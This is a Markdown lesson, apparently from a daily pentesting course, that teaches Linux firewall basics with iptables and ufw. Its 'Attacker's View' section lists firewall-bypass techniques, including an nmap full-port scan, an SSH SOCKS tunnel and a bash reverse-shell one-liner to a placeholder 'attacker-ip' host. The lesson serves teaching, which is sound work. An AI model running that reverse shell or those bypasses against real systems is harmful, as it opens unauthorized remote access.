# Day 16 – Firewalls & Packet Filtering (iptables & ufw)
<img width="1200" height="400" alt="image" src="https://github.com/user-attachments/assets/889f5ffe-e362-4c06-a357-c83ab0bb131b" />

Firewalls are one of the first layers of defense in any Linux system. As hackers or pentesters, understanding how they work — and how to bypass them — is essential.

---

## 🔹 1. Understanding iptables

`iptables` is the traditional firewall tool in Linux. It controls the traffic that flows in and out of the system.

- **Tables**: 
  - `filter` → default, used for packet filtering
  - `nat` → used for network address translation (e.g., port forwarding)
  - `mangle` → advanced packet modification

- **Chains**: 
  - `INPUT` → incoming traffic
  - `OUTPUT` → outgoing traffic
  - `FORWARD` → traffic routed through the system

### 📌 Viewing rules
```bash
iptables -L -n -v
```

### 📌 Adding rules
```bash
iptables -A INPUT -p tcp --dport 22 -j ACCEPT   # Allow SSH
iptables -A INPUT -j DROP                       # Drop everything else
```

---

## 🔹 2. UFW – Uncomplicated Firewall

`ufw` is a simpler frontend to `iptables`.

### 📌 Basic commands
```bash
ufw status
ufw enable
ufw allow 80/tcp
ufw deny 23/tcp
ufw default deny incoming
ufw default allow outgoing
```

This simplifies firewall management for administrators.

---

## 🔹 3. Attacker’s View

Firewalls create barriers, but attackers always look for misconfigurations:

- **Port scanning:**  
  ```bash
  nmap -Pn -p- target.com
  ```
  (`-Pn` skips ICMP echo, useful if ping is blocked.)

- **Tunneling:**  
  Attackers often tunnel traffic to bypass firewalls:  
  ```bash
  ssh -D 9050 user@target.com
  ```
  (Creates a SOCKS proxy.)

- **Outbound traffic:**  
  Even if inbound is locked, many firewalls allow outbound. This can be abused for reverse shells:  
  ```bash
  bash -i >& /dev/tcp/attacker-ip/4444 0>&1
  ```

---

## 🔹 4. Real-World Pentesting Scenarios

- Misconfigured firewalls with `ACCEPT` rules before restrictive ones.  
- Firewalls allowing “trusted” IPs that attackers can spoof.  
- Services bound to `0.0.0.0` but intended only for localhost.  

---

## 🔹 5. Practical Tasks

1. List all current firewall rules on your machine.  
   ```bash
   iptables -L -n -v
   ```

2. Block SSH access (port 22) with iptables, then try to connect.  

3. Using `ufw`, configure your system to:  
   - Allow HTTP (80) and HTTPS (443).  
   - Deny all other inbound connections.  

4. Simulate bypass: Run `nmap` with `-Pn` against a target with ICMP blocked.  

---

## 🔹 6. Key Takeaways

- Firewalls filter traffic using rules in tables/chains.  
- `iptables` gives fine control; `ufw` simplifies management.  
- Attackers focus on misconfigurations, tunneling, and outbound traffic.  
- Always test firewall behavior during pentests.

---

📢 Follow **@CyberSecPlayground** on Telegram for more daily Linux hacking lessons, red team tips, and pentesting tricks!
